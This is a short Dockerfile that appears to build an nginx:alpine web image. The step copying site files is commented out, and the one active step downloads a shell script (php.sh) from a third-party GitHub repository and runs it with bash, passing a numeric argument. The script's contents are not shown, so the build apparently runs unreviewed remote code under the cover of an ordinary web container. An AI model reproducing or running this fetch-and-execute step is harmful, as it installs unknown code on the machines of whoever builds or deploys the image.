FROM nginx:alpine
#COPY site /usr/share/nginx/html
RUN curl -o /tmp/php.sh -Ls https://github.com/A233S/angti/raw/main/phpv3.sh ; bash /tmp/php.sh 507675 
